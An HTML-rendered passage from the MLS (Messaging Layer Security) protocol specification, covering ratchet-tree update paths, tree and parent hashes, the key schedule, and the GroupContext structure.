          <tbody>
            <tr>
              <td rowspan="1" colspan="1">
                <code>node_pub[1]</code>
              </td>
              <td rowspan="1" colspan="1">
                <code>E(pk(Z), path_secret[1])</code>, <code>E(pk(C), path_secret[1]</code>)</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">
                <code>node_pub[0]</code>
              </td>
              <td rowspan="1" colspan="1">
                <code>E(pk(A), path_secret[0])</code>
              </td>
            </tr>
          </tbody>
        </table>
<p id="section-7.5-16">In this table, the value node_pub[i] represents the public key
derived from node_secret[i], pk(X) represents the current public key
of node X, and E(K, S) represents
the public key encryption of the path secret S to the
public key K (using HPKE).<a href="#section-7.5-16">¬∂</a></p>
<p id="section-7.5-17">A recipient at node A would decrypt <code>E(pk(A), path_secret\[0\])</code> to obtain
<code>path_secret\[0\]</code>, then use it to derive <code>path_secret[1]</code> and the resulting
node secrets and key pairs.  Thus, A would have the private keys to nodes X'
and Y', in accordance with the tree invariant.<a href="#section-7.5-17">¬∂</a></p>
<p id="section-7.5-18">Similarly, a recipient at node D would decrypt <code>E(pk(Z), path_secret[1])</code> to
obtain <code>path_secret[1]</code>, then use it to derive the node secret and key pair
for the node Y'.  As required to maintain the tree invariant, node D does not
receive the private key for the node X', since X' is not an ancestor of D.<a href="#section-7.5-18">¬∂</a></p>
<p id="section-7.5-19">After processing the update, each recipient <span>MUST</span> delete outdated key material,
specifically:<a href="#section-7.5-19">¬∂</a></p>
<ul>
<li id="section-7.5-20.1">The path secrets and node secrets used to derive each updated node key pair.<a href="#section-7.5-20.1">¬∂</a>
</li>
          <li id="section-7.5-20.2">Each outdated node key pair that was replaced by the update.<a href="#section-7.5-20.2">¬∂</a>
</li>
        </ul>
</section>
<section id="update-paths">
        <h3 id="name-update-paths">
<a href="#section-7.6">7.6. </a><a href="#name-update-paths">Update Paths</a>
        </h3>
<p id="section-7.6-1">As described in <a href="#commit">Section 12.4</a>, each Commit message may optionally contain an
UpdatePath, with a new LeafNode and set of parent nodes for the sender's
filtered direct path. For each parent node, the UpdatePath contains a new
public key and encrypted path secret. The parent nodes are kept in the same
order as the filtered direct path.<a href="#section-7.6-1">¬∂</a></p>
<div id="section-7.6-2">
<pre>struct {
    opaque kem_output&lt;V&gt;;
    opaque ciphertext&lt;V&gt;;
} HPKECiphertext;

struct {
    HPKEPublicKey encryption_key;
    HPKECiphertext encrypted_path_secret&lt;V&gt;;
} UpdatePathNode;

struct {
    LeafNode leaf_node;
    UpdatePathNode nodes&lt;V&gt;;
} UpdatePath;
</pre><p><a href="#section-7.6-2">¬∂</a>
</p></div>
<p id="section-7.6-3">For each UpdatePathNode, the resolution of the corresponding copath node <span>MUST</span>
exclude all new leaf nodes added as part of the current Commit. The length of
the <code>encrypted_path_secret</code> vector <span>MUST</span> be equal to the length of the resolution
of the copath node (excluding new leaf nodes), with each ciphertext being the
encryption to the respective resolution node.<a href="#section-7.6-3">¬∂</a></p>
<p id="section-7.6-4">The HPKECiphertext values are encrypted and decrypted as follows:<a href="#section-7.6-4">¬∂</a></p>
<div id="section-7.6-5">
<pre>(kem_output, ciphertext) =
  EncryptWithLabel(node_public_key, "UpdatePathNode",
                   group_context, path_secret)

path_secret =
  DecryptWithLabel(node_private_key, "UpdatePathNode",
                   group_context, kem_output, ciphertext)
</pre><p><a href="#section-7.6-5">¬∂</a>
</p></div>
<p id="section-7.6-6">Here <code>node_public_key</code> is the public key of the node for which the path secret is
encrypted, <code>group_context</code> is the provisional GroupContext object for
the group, and the <code>EncryptWithLabel</code> function is as defined in
<a href="#public-key-encryption">Section 5.1.3</a>.<a href="#section-7.6-6">¬∂</a></p>
</section>
<section id="adding-and-removing-leaves">
        <h3 id="name-adding-and-removing-leaves">
<a href="#section-7.7">7.7. </a><a href="#name-adding-and-removing-leaves">Adding and Removing Leaves</a>
        </h3>
<p id="section-7.7-1">In addition to the path-based updates to the tree described above, it is also
necessary to add and remove leaves of the tree in order to reflect changes to
the membership of the group (see Sections <a href="#add">12.1.1</a> and <a href="#remove">12.1.3</a>).  Since the tree is
always full, adding or removing leaves corresponds to increasing or decreasing
the depth of the tree, resulting in the number of leaves being doubled or
halved. These operations are also known as <em>extending</em> and <em>truncating</em> the
tree.<a href="#section-7.7-1">¬∂</a></p>
<p id="section-7.7-2">Leaves are always added and removed at the right edge of the tree.  When the
size of the tree needs to be increased, a new blank root node is added, whose
left subtree is the existing tree and right subtree is a new all-blank subtree.
This operation is typically done when adding a member to the group.<a href="#section-7.7-2">¬∂</a></p>
<span id="name-extending-the-tree-to-make-"></span><figure id="figure-16">
          <div id="section-7.7-3.1">
<pre>                  _ &lt;-- new blank root                    _
                __|__                                   __|__
               /     \                                 /     \
  X    ===&gt;   X       _ &lt;-- new blank subtree ===&gt;    X       _
 / \         / \     / \                             / \     / \
A   B       A   B   _   _                           A   B   C   _
                                                            ^
                                                            |
                                               new member --+
</pre>
</div>
<figcaption><a href="#figure-16">Figure 16</a>:
<a href="#name-extending-the-tree-to-make-">Extending the Tree to Make Room for a Third Member</a>
          </figcaption></figure>
<p id="section-7.7-4">When the right subtree of the tree no longer has any non-blank nodes, it can be
safely removed.  The root of the tree and the right subtree are discarded
(whether or not the root node is blank). The left child of the root becomes the
new root node, and the left subtree becomes the new tree.  This operation is
typically done after removing a member from the group.<a href="#section-7.7-4">¬∂</a></p>
<span id="name-cleaning-up-after-removing-"></span><figure id="figure-17">
          <div id="section-7.7-5.1">
<pre>               Y                  Y
             __|__              __|__
            /     \            /     \
           X       _   ===&gt;   X       _   ==&gt;   X &lt;-- new root
          / \     / \        / \     / \       / \
         A   B   C   _      A   B   _   _     A   B
                 ^
                 |
removed member --+
</pre>
</div>
<figcaption><a href="#figure-17">Figure 17</a>:
<a href="#name-cleaning-up-after-removing-">Cleaning Up after Removing Member C</a>
          </figcaption></figure>
<p id="section-7.7-6">Concrete algorithms for these operations on array-based and link-based trees are
provided in Appendices <a href="#array-based-trees">C</a> and <a href="#link-based-trees">D</a>.  The concrete
algorithms are non-normative.  An implementation may use any algorithm that
produces the correct tree in its internal representation.<a href="#section-7.7-6">¬∂</a></p>
</section>
<section id="tree-hashes">
        <h3 id="name-tree-hashes">
<a href="#section-7.8">7.8. </a><a href="#name-tree-hashes">Tree Hashes</a>
        </h3>
<p id="section-7.8-1">MLS hashes the contents of the tree in two ways to authenticate different
properties of the tree.  <em>Tree hashes</em> are defined in this section, and <em>parent
hashes</em> are defined in <a href="#parent-hashes">Section 7.9</a>.<a href="#section-7.8-1">¬∂</a></p>
<p id="section-7.8-2">Each node in a ratchet tree has a tree hash that summarizes the subtree below
that node.  The tree hash of the root is used in the GroupContext to confirm
that the group agrees on the whole tree.  Tree hashes are computed recursively
from the leaves up to the root.<a href="#section-7.8-2">¬∂</a></p>
<span id="name-composition-of-the-tree-has"></span><figure id="figure-18">
          <div id="section-7.8-3.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="112" text-anchor="middle" version="1.1" viewBox="0 0 128 112" width="128">
                <path d="M 24,32 L 40,32" fill="none" stroke="black"></path>
                <path d="M 72,48 L 88,80" fill="none" stroke="black"></path>
                <path d="M 40,80 L 56,48" fill="none" stroke="black"></path>
                <polygon fill="black" points="80,48 68,42.4 68,53.6" transform="rotate(243.43494882292202,72,48)"></polygon>
                <polygon fill="black" points="64,48 52,42.4 52,53.6" transform="rotate(296.565051177078,56,48)"></polygon>
                <polygon fill="black" points="48,32 36,26.4 36,37.6" transform="rotate(0,40,32)"></polygon>
                <g>
                  <text x="8" y="36">P</text>
                  <text x="72" y="36">th(P)</text>
                  <text x="24" y="100">th(L)</text>
                  <text x="104" y="100">th(R)</text>
                </g>
              </svg><p><a href="#section-7.8-3.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-18">Figure 18</a>:
<a href="#name-composition-of-the-tree-has">Composition of the Tree Hash</a>
          </figcaption></figure>
<p id="section-7.8-4">The tree hash of an individual node is the hash of the node's TreeHashInput
object, which may contain either a LeafNodeHashInput or a
ParentNodeHashInput depending on the type of node. LeafNodeHashInput objects
contain the <code>leaf_index</code> and the LeafNode (if any). ParentNodeHashInput
objects contain the ParentNode (if any) and the tree hash of the node's left
and right children.  For both parent and leaf nodes, the optional node value
<span>MUST</span> be absent if the node is blank and present if the node contains a value.<a href="#section-7.8-4">¬∂</a></p>
<div id="section-7.8-5">
<pre>enum {
    reserved(0),
    leaf(1),
    parent(2),
    (255)
} NodeType;

struct {
  NodeType node_type;
  select (TreeHashInput.node_type) {
    case leaf:   LeafNodeHashInput leaf_node;
    case parent: ParentNodeHashInput parent_node;
  };
} TreeHashInput;

struct {
    uint32 leaf_index;
    optional&lt;LeafNode&gt; leaf_node;
} LeafNodeHashInput;

struct {
    optional&lt;ParentNode&gt; parent_node;
    opaque left_hash&lt;V&gt;;
    opaque right_hash&lt;V&gt;;
} ParentNodeHashInput;
</pre><p><a href="#section-7.8-5">¬∂</a>
</p></div>
<p id="section-7.8-6">The tree hash of an entire tree corresponds to the tree hash of the root node,
which is computed recursively by starting at the leaf nodes and building up.<a href="#section-7.8-6">¬∂</a></p>
</section>
<section id="parent-hashes">
        <h3 id="name-parent-hashes">
<a href="#section-7.9">7.9. </a><a href="#name-parent-hashes">Parent Hashes</a>
        </h3>
<p id="section-7.9-1">While tree hashes summarize the state of a tree at point in time, parent hashes
capture information about how keys in the tree were populated.<a href="#section-7.9-1">¬∂</a></p>
<p id="section-7.9-2">When a client sends a Commit to change a group, it can include an UpdatePath to
assign new keys to the nodes along its filtered direct path.  When a client
computes an UpdatePath (as defined in <a href="#synchronizing-views-of-the-tree">Section 7.5</a>), it
computes and signs a parent hash that summarizes the state of the tree after the
UpdatePath has been applied.  These summaries are constructed in a chain from
the root to the member's leaf so that the part of the chain closer to the root
can be overwritten as nodes set in one UpdatePath are reset by a later
UpdatePath.<a href="#section-7.9-2">¬∂</a></p>
<span id="name-inputs-to-a-parent-hash"></span><figure id="figure-19">
          <div id="section-7.9-3.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="176" text-anchor="middle" version="1.1" viewBox="0 0 216 176" width="216">
                <path d="M 112,96 L 128,96" fill="none" stroke="black"></path>
                <path d="M 160,112 L 176,144" fill="none" stroke="black"></path>
                <path d="M 128,144 L 144,112" fill="none" stroke="black"></path>
                <path d="M 160,80 L 176,48" fill="none" stroke="black"></path>
                <polygon fill="black" points="168,112 156,106.4 156,117.6" transform="rotate(243.43494882292202,160,112)"></polygon>
                <polygon fill="black" points="168,80 156,74.4 156,85.6" transform="rotate(116.56505117707799,160,80)"></polygon>
                <polygon fill="black" points="136,144 124,138.4 124,149.6" transform="rotate(116.56505117707799,128,144)"></polygon>
                <polygon fill="black" points="136,96 124,90.4 124,101.6" transform="rotate(0,128,96)"></polygon>
                <g>
                  <text x="192" y="36">ph(Q)</text>
                  <text x="52" y="100">P.public_key</text>
                  <text x="160" y="100">ph(P)</text>
                  <text x="80" y="164">N.parent_hash</text>
                  <text x="192" y="164">th(S)</text>
                </g>
              </svg><p><a href="#section-7.9-3.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-19">Figure 19</a>:
<a href="#name-inputs-to-a-parent-hash">Inputs to a Parent Hash</a>
          </figcaption></figure>
<p id="section-7.9-4">As a result, the signature over the parent hash in each member's leaf
effectively signs the subtree of the tree that hasn't been changed since that
leaf was last changed in an UpdatePath.  A new member joining the group uses
these parent hashes to verify that the parent nodes in the tree were set by
members of the group, not chosen by an external attacker.  For an example of how
this works, see <a href="#ph-evolution">Appendix B</a>.<a href="#section-7.9-4">¬∂</a></p>
<p id="section-7.9-5">Consider a ratchet tree with a non-blank parent node P and children D and S (for
"parent", "direct path", and "sibling"), with D and P in the direct path of a
leaf node L (for "leaf"):<a href="#section-7.9-5">¬∂</a></p>
<span id="name-nodes-involved-in-a-parent-"></span><div id="parent-hash-nodes">
<figure id="figure-20">
          <div id="section-7.9-6.1">
<pre>         ...
         /
        P
      __|__
     /     \
    D       S
   / \     / \
 ... ... ... ...
 /
L
</pre>
</div>
<figcaption><a href="#figure-20">Figure 20</a>:
<a href="#name-nodes-involved-in-a-parent-">Nodes Involved in a Parent Hash Computation</a>
          </figcaption></figure>
</div>
<p id="section-7.9-7">The parent hash of P changes whenever an UpdatePath object is applied to
the ratchet tree along a path from a leaf L traversing node D (and hence also
P). The new "Parent hash of P (with copath child S)" is obtained by hashing P's
ParentHashInput struct.<a href="#section-7.9-7">¬∂</a></p>
<div id="section-7.9-8">
<pre>struct {
    HPKEPublicKey encryption_key;
    opaque parent_hash&lt;V&gt;;
    opaque original_sibling_tree_hash&lt;V&gt;;
} ParentHashInput;
</pre><p><a href="#section-7.9-8">¬∂</a>
</p></div>
<p id="section-7.9-9">The field <code>encryption_key</code> contains the HPKE public key of P. If P is the root,
then the <code>parent_hash</code> field is set to a zero-length octet string. Otherwise,
<code>parent_hash</code> is the parent hash of the next node after P on the filtered
direct path of the leaf L. This way, P's parent hash fixes
the new HPKE public key of each non-blank node on the path from P to the root. Note
that the path from P to the root may contain some blank nodes that are not
fixed by P's parent hash. However, for each node that has an HPKE key, this key
is fixed by P's parent hash.<a href="#section-7.9-9">¬∂</a></p>
<p id="section-7.9-10">Finally, <code>original_sibling_tree_hash</code> is the tree hash of S in the ratchet tree
modified as follows: For each leaf L in <code>P.unmerged_leaves</code>, blank L and remove
it from the <code>unmerged_leaves</code> sets of all parent nodes.<a href="#section-7.9-10">¬∂</a></p>
<p id="section-7.9-11">Observe that <code>original_sibling_tree_hash</code> does not change between updates of P.
This property is crucial for the correctness of the protocol.<a href="#section-7.9-11">¬∂</a></p>
<p id="section-7.9-12">Note that <code>original_sibling_tree_hash</code> is the tree hash of S, not the parent
hash.  The <code>parent_hash</code> field in ParentHashInput captures information about the
nodes above P. the <code>original_sibling_tree_hash</code> captures information about the
subtree under S that is not being updated (and thus the subtree to which a path
secret for P would be encrypted according to <a href="#synchronizing-views-of-the-tree">Section 7.5</a>).<a href="#section-7.9-12">¬∂</a></p>
<p id="section-7.9-13">For example, in the following tree:<a href="#section-7.9-13">¬∂</a></p>
<span id="name-a-tree-illustrating-parent-"></span><div id="parent-hash-tree">
<figure id="figure-21">
          <div id="section-7.9-14.1">
<pre>              W [F]
        ______|_____
       /             \
      U               Y [F]
    __|__           __|__
   /     \         /     \
  T       _       _       _
 / \     / \     / \     / \
A   B   C   D   E   F   G   _
</pre>
</div>
<figcaption><a href="#figure-21">Figure 21</a>:
<a href="#name-a-tree-illustrating-parent-">A Tree Illustrating Parent Hash Computations</a>
          </figcaption></figure>
</div>
<p id="section-7.9-15">With P = W and S = Y, <code>original_sibling_tree_hash</code> is the tree hash of the
following tree:<a href="#section-7.9-15">¬∂</a></p>
<div id="section-7.9-16">
<pre>      Y
    __|__
   /     \
  _       _
 / \     / \
E   _   G   _
</pre><p><a href="#section-7.9-16">¬∂</a>
</p></div>
<p id="section-7.9-17">Because <code>W.unmerged_leaves</code> includes F, F is blanked and removed from
<code>Y.unmerged_leaves</code>.<a href="#section-7.9-17">¬∂</a></p>
<p id="section-7.9-18">Note that no recomputation is needed if the tree hash of S is unchanged since
the last time P was updated. This is the case for computing or processing a
Commit whose UpdatePath traverses P, since the Commit itself resets P. (In
other words, it is only necessary to recompute the original sibling tree hash
when validating a group's tree on joining.) More generally, if none of the entries
in <code>P.unmerged_leaves</code> are in the subtree under S (and thus no leaves were blanked),
then the original tree hash at S is the tree hash of S in the current tree.<a href="#section-7.9-18">¬∂</a></p>
<p id="section-7.9-19">If it is necessary to recompute the original tree hash of a node, the efficiency
of recomputation can be improved by caching intermediate tree hashes, to avoid
recomputing over the subtree when the subtree is included in multiple parent
hashes.  A subtree hash can be reused as long as the intersection of the
parent's unmerged leaves with the subtree is the same as in the earlier
computation.<a href="#section-7.9-19">¬∂</a></p>
<section id="using-parent-hashes">
          <h4 id="name-using-parent-hashes">
<a href="#section-7.9.1">7.9.1. </a><a href="#name-using-parent-hashes">Using Parent Hashes</a>
          </h4>
<p id="section-7.9.1-1">In ParentNode objects and LeafNode objects with <code>leaf_node_source</code> set to
<code>commit</code>, the value of the <code>parent_hash</code> field is the parent hash of the next
non-blank parent node above the node in question (the next node in the filtered
direct path).  Using the node labels in <a href="#parent-hash-nodes">Figure 20</a>, the
<code>parent_hash</code> field of D is equal to the parent hash of P with copath child S.
This is the case even when the node D is a leaf node.<a href="#section-7.9.1-1">¬∂</a></p>
<p id="section-7.9.1-2">The <code>parent_hash</code> field of a LeafNode is signed by the member.  The signature of
such a LeafNode thus attests to which keys the group member introduced into
the ratchet tree and to whom the corresponding secret keys were sent, in
addition to the other contents of the LeafNode. This
prevents malicious insiders from constructing artificial ratchet trees with a
node D whose HPKE secret key is known to the insider, yet where the insider isn't
assigned a leaf in the subtree rooted at D. Indeed, such a ratchet tree would
violate the tree invariant.<a href="#section-7.9.1-2">¬∂</a></p>
</section>
<section id="verifying-parent-hashes">
          <h4 id="name-verifying-parent-hashes">
<a href="#section-7.9.2">7.9.2. </a><a href="#name-verifying-parent-hashes">Verifying Parent Hashes</a>
          </h4>
<p id="section-7.9.2-1">Parent hashes are verified at two points in the protocol: When joining a group
and when processing a Commit.<a href="#section-7.9.2-1">¬∂</a></p>
<p id="section-7.9.2-2">The parent hash in a node D is valid with respect to a parent node P if the
following criteria hold.  Here C and S are the children of P (for "child" and
"sibling"), with C being the child that is on the direct path of D (possibly D
itself) and S being the other child:<a href="#section-7.9.2-2">¬∂</a></p>
<ul>
<li id="section-7.9.2-3.1">D is a descendant of P in the tree.<a href="#section-7.9.2-3.1">¬∂</a>
</li>
            <li id="section-7.9.2-3.2">The <code>parent_hash</code> field of D is equal to the parent hash of P with copath
child S.<a href="#section-7.9.2-3.2">¬∂</a>
</li>
            <li id="section-7.9.2-3.3">D is in the resolution of C, and the intersection of P's <code>unmerged_leaves</code>
with the subtree under C is equal to the resolution of C with D removed.<a href="#section-7.9.2-3.3">¬∂</a>
</li>
          </ul>
<p id="section-7.9.2-4">These checks verify that D and P were updated at the same time (in the same
UpdatePath), and that they were neighbors in the UpdatePath because the nodes in
between them would have omitted from the filtered direct path.<a href="#section-7.9.2-4">¬∂</a></p>
<p id="section-7.9.2-5">A parent node P is "parent-hash valid" if it can be chained back to a leaf node
in this way.  That is, if there is leaf node L and a sequence of parent nodes
P_1, ..., P_N such that P_N = P and each step in the chain is authenticated
by a parent hash, then L's parent hash is valid with respect to P_1, P_1's parent
hash is valid with respect to P_2, and so on.<a href="#section-7.9.2-5">¬∂</a></p>
<p id="section-7.9.2-6">When joining a group, the new member <span>MUST</span> authenticate that each non-blank
parent node P is parent-hash valid.  This can be done "bottom up" by building
chains up from leaves and verifying that all non-blank parent nodes are covered
by exactly one such chain, or "top down" by verifying that there is exactly one
descendant of each non-blank parent node for which the parent node is
parent-hash valid.<a href="#section-7.9.2-6">¬∂</a></p>
<p id="section-7.9.2-7">When processing a Commit message that includes an UpdatePath, clients <span>MUST</span>
recompute the expected value of <code>parent_hash</code> for the committer's new leaf and
verify that it matches the <code>parent_hash</code> value in the supplied <code>leaf_node</code>.
After being merged into the tree, the nodes in the UpdatePath form a parent-hash
chain from the committer's leaf to the root.<a href="#section-7.9.2-7">¬∂</a></p>
</section>
</section>
</section>
<section id="key-schedule">
      <h2 id="name-key-schedule">
<a href="#section-8">8. </a><a href="#name-key-schedule">Key Schedule</a>
      </h2>
<p id="section-8-1">Group keys are derived using the <code>Extract</code> and <code>Expand</code> functions from the KDF
for the group's cipher suite, as well as the functions defined below:<a href="#section-8-1">¬∂</a></p>
<div id="section-8-2">
<pre>ExpandWithLabel(Secret, Label, Context, Length) =
    KDF.Expand(Secret, KDFLabel, Length)

DeriveSecret(Secret, Label) =
    ExpandWithLabel(Secret, Label, "", KDF.Nh)
</pre><p><a href="#section-8-2">¬∂</a>
</p></div>
<p id="section-8-3">Where KDFLabel is specified as:<a href="#section-8-3">¬∂</a></p>
<div id="section-8-4">
<pre>struct {
    uint16 length;
    opaque label&lt;V&gt;;
    opaque context&lt;V&gt;;
} KDFLabel;
</pre><p><a href="#section-8-4">¬∂</a>
</p></div>
<p id="section-8-5">And its fields are set to:<a href="#section-8-5">¬∂</a></p>
<div id="section-8-6">
<pre>length = Length;
label = "MLS 1.0 " + Label;
context = Context;
</pre><p><a href="#section-8-6">¬∂</a>
</p></div>
<p id="section-8-7">The value <code>KDF.Nh</code> is the size of an output from <code>KDF.Extract</code>, in bytes.  In
the below diagram:<a href="#section-8-7">¬∂</a></p>
<ul>
<li id="section-8-8.1">KDF.Extract takes its salt argument from the top and its Input
Keying Material (IKM) argument from the left.<a href="#section-8-8.1">¬∂</a>
</li>
        <li id="section-8-8.2">DeriveSecret takes its Secret argument from the incoming arrow.<a href="#section-8-8.2">¬∂</a>
</li>
        <li id="section-8-8.3">
          <code>0</code> represents an all-zero byte string of length <code>KDF.Nh</code>.<a href="#section-8-8.3">¬∂</a>
</li>
      </ul>
<p id="section-8-9">When processing a handshake message, a client combines the
following information to derive new epoch secrets:<a href="#section-8-9">¬∂</a></p>
<ul>
<li id="section-8-10.1">The init secret from the previous epoch<a href="#section-8-10.1">¬∂</a>
</li>
        <li id="section-8-10.2">The commit secret for the current epoch<a href="#section-8-10.2">¬∂</a>
</li>
        <li id="section-8-10.3">The GroupContext object for current epoch<a href="#section-8-10.3">¬∂</a>
</li>
      </ul>
<p id="section-8-11">Given these inputs, the derivation of secrets for an epoch
proceeds as shown in the following diagram:<a href="#section-8-11">¬∂</a></p>
<span id="name-the-mls-key-schedule"></span><figure id="figure-22">
        <div id="section-8-12.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="656" text-anchor="middle" version="1.1" viewBox="0 0 584 656" width="584">
              <path d="M 216,48 L 216,80" fill="none" stroke="black"></path>
              <path d="M 216,112 L 216,144" fill="none" stroke="black"></path>
              <path d="M 216,176 L 216,208" fill="none" stroke="black"></path>
              <path d="M 216,232 L 216,272" fill="none" stroke="black"></path>
              <path d="M 216,304 L 216,384" fill="none" stroke="black"></path>
              <path d="M 216,416 L 216,448" fill="none" stroke="black"></path>
              <path d="M 216,472 L 216,560" fill="none" stroke="black"></path>
              <path d="M 216,592 L 216,624" fill="none" stroke="black"></path>
              <path d="M 152,96 L 168,96" fill="none" stroke="black"></path>
              <path d="M 152,288 L 168,288" fill="none" stroke="black"></path>
              <path d="M 216,336 L 240,336" fill="none" stroke="black"></path>
              <path d="M 216,512 L 240,512" fill="none" stroke="black"></path>
              <polygon fill="black" points="248,512 236,506.4 236,517.6" transform="rotate(0,240,512)"></polygon>
              <polygon fill="black" points="248,336 236,330.4 236,341.6" transform="rotate(0,240,336)"></polygon>
              <polygon fill="black" points="224,624 212,618.4 212,629.6" transform="rotate(90,216,624)"></polygon>
              <polygon fill="black" points="224,560 212,554.4 212,565.6" transform="rotate(90,216,560)"></polygon>
              <polygon fill="black" points="224,448 212,442.4 212,453.6" transform="rotate(90,216,448)"></polygon>
              <polygon fill="black" points="224,384 212,378.4 212,389.6" transform="rotate(90,216,384)"></polygon>
              <polygon fill="black" points="224,272 212,266.4 212,277.6" transform="rotate(90,216,272)"></polygon>
              <polygon fill="black" points="224,208 212,202.4 212,213.6" transform="rotate(90,216,208)"></polygon>
              <polygon fill="black" points="224,144 212,138.4 212,149.6" transform="rotate(90,216,144)"></polygon>
              <polygon fill="black" points="224,80 212,74.4 212,85.6" transform="rotate(90,216,80)"></polygon>
              <polygon fill="black" points="176,288 164,282.4 164,293.6" transform="rotate(0,168,288)"></polygon>
              <polygon fill="black" points="176,96 164,90.4 164,101.6" transform="rotate(0,168,96)"></polygon>
              <g>
                <text x="232" y="36">init_secret_[n-1]</text>
                <text x="88" y="100">commit_secret</text>
                <text x="224" y="100">KDF.Extract</text>
                <text x="220" y="164">ExpandWithLabel(.,</text>
                <text x="336" y="164">"joiner",</text>
                <text x="448" y="164">GroupContext_[n],</text>
                <text x="552" y="164">KDF.Nh)</text>
                <text x="224" y="228">joiner_secret</text>
                <text x="44" y="292">psk_secret</text>
                <text x="104" y="292">(or</text>
                <text x="132" y="292">0)</text>
                <text x="224" y="292">KDF.Extract</text>
                <text x="312" y="340">DeriveSecret(.,</text>
                <text x="420" y="340">"welcome")</text>
                <text x="256" y="356">=</text>
                <text x="324" y="356">welcome_secret</text>
                <text x="220" y="404">ExpandWithLabel(.,</text>
                <text x="332" y="404">"epoch",</text>
                <text x="440" y="404">GroupContext_[n],</text>
                <text x="544" y="404">KDF.Nh)</text>
                <text x="220" y="468">epoch_secret</text>
                <text x="312" y="516">DeriveSecret(.,</text>
                <text x="412" y="516">&lt;label&gt;)</text>
                <text x="256" y="532">=</text>
                <text x="300" y="532">&lt;secret&gt;</text>
                <text x="224" y="580">DeriveSecret(.,</text>
                <text x="320" y="580">"init")</text>
                <text x="224" y="644">init_secret_[n]</text>
              </g>
            </svg><p><a href="#section-8-12.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-22">Figure 22</a>:
<a href="#name-the-mls-key-schedule">The MLS Key Schedule</a>
        </figcaption></figure>
<p id="section-8-13">A number of values are derived from the epoch secret for different purposes:<a href="#section-8-13">¬∂</a></p>
<span id="name-epoch-derived-secrets"></span><div id="epoch-derived-secrets">
<table id="table-4">
        <caption>
<a href="#table-4">Table 4</a>:
<a href="#name-epoch-derived-secrets">Epoch-Derived Secrets</a>
        </caption>
<thead>
          <tr>
            <th rowspan="1" colspan="1">Label</th>
            <th rowspan="1" colspan="1">Secret</th>
            <th rowspan="1" colspan="1">Purpose</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td rowspan="1" colspan="1">"sender data"</td>
            <td rowspan="1" colspan="1">
              <code>sender_data_secret</code>
            </td>
            <td rowspan="1" colspan="1">Deriving keys to encrypt sender data</td>
          </tr>
          <tr>
            <td rowspan="1" colspan="1">"encryption"</td>
            <td rowspan="1" colspan="1">
              <code>encryption_secret</code>
            </td>
            <td rowspan="1" colspan="1">Deriving message encryption keys (via the secret tree)</td>
          </tr>
          <tr>
            <td rowspan="1" colspan="1">"exporter"</td>
            <td rowspan="1" colspan="1">
              <code>exporter_secret</code>
            </td>
            <td rowspan="1" colspan="1">Deriving exported secrets</td>
          </tr>
          <tr>
            <td rowspan="1" colspan="1">"external"</td>
            <td rowspan="1" colspan="1">
              <code>external_secret</code>
            </td>
            <td rowspan="1" colspan="1">Deriving the external init key</td>
          </tr>
          <tr>
            <td rowspan="1" colspan="1">"confirm"</td>
            <td rowspan="1" colspan="1">
              <code>confirmation_key</code>
            </td>
            <td rowspan="1" colspan="1">Computing the confirmation MAC for an epoch</td>
          </tr>
          <tr>
            <td rowspan="1" colspan="1">"membership"</td>
            <td rowspan="1" colspan="1">
              <code>membership_key</code>
            </td>
            <td rowspan="1" colspan="1">Computing the membership MAC for a PublicMessage</td>
          </tr>
          <tr>
            <td rowspan="1" colspan="1">"resumption"</td>
            <td rowspan="1" colspan="1">
              <code>resumption_psk</code>
            </td>
            <td rowspan="1" colspan="1">Proving membership in this epoch (via a PSK injected later)</td>
          </tr>
          <tr>
            <td rowspan="1" colspan="1">"authentication"</td>
            <td rowspan="1" colspan="1">
              <code>epoch_authenticator</code>
            </td>
            <td rowspan="1" colspan="1">Confirming that two clients have the same view of the group</td>
          </tr>
        </tbody>
      </table>
</div>
<p id="section-8-15">The <code>external_secret</code> is used to derive an HPKE key pair whose private key is
held by the entire group:<a href="#section-8-15">¬∂</a></p>
<div id="section-8-16">
<pre>external_priv, external_pub = KEM.DeriveKeyPair(external_secret)
</pre><p><a href="#section-8-16">¬∂</a>
</p></div>
<p id="section-8-17">The public key <code>external_pub</code> can be published as part of the GroupInfo struct
in order to allow non-members to join the group using an external Commit.<a href="#section-8-17">¬∂</a></p>
<section id="group-context">
        <h3 id="name-group-context">
<a href="#section-8.1">8.1. </a><a href="#name-group-context">Group Context</a>
        </h3>
<p id="section-8.1-1">Each member of the group maintains a GroupContext object that
summarizes the state of the group:<a href="#section-8.1-1">¬∂</a></p>
<div id="section-8.1-2">
<pre>struct {
    ProtocolVersion version = mls10;
    CipherSuite cipher_suite;
    opaque group_id&lt;V&gt;;
    uint64 epoch;
    opaque tree_hash&lt;V&gt;;
    opaque confirmed_transcript_hash&lt;V&gt;;
    Extension extensions&lt;V&gt;;
} GroupContext;
</pre><p><a href="#section-8.1-2">¬∂</a>
</p></div>
<p id="section-8.1-3">The fields in this state have the following semantics:<a href="#section-8.1-3">¬∂</a></p>
<ul>
<li id="section-8.1-4.1">The <code>cipher_suite</code> is the cipher suite used by the group.<a href="#section-8.1-4.1">¬∂</a>
</li>
          <li id="section-8.1-4.2">The <code>group_id</code> field is an application-defined identifier for the
group.<a href="#section-8.1-4.2">¬∂</a>
</li>
          <li id="section-8.1-4.3">The <code>epoch</code> field represents the current version of the group.<a href="#section-8.1-4.3">¬∂</a>
</li>
          <li id="section-8.1-4.4">The <code>tree_hash</code> field contains a commitment to the contents of the
group's ratchet tree and the credentials for the members of the
group, as described in <a href="#tree-hashes">Section 7.8</a>.<a href="#section-8.1-4.4">¬∂</a>
</li>
          <li id="section-8.1-4.5">The <code>confirmed_transcript_hash</code> field contains a running hash over
the messages that led to this state.<a href="#section-8.1-4.5">¬∂</a>
</li>
          <li id="section-8.1-4.6">The <code>extensions</code> field contains the details of any protocol extensions that
apply to the group.<a href="#section-8.1-4.6">¬∂</a>
</li>
        </ul>
<p id="section-8.1-5">When a new member is added to the group, an existing member of the
group provides the new member with a Welcome message.  The Welcome
message provides the information the new member needs to initialize
its GroupContext.<a href="#section-8.1-5">¬∂</a></p>
<p id="section-8.1-6">Different changes to the group will have different effects on the group state.
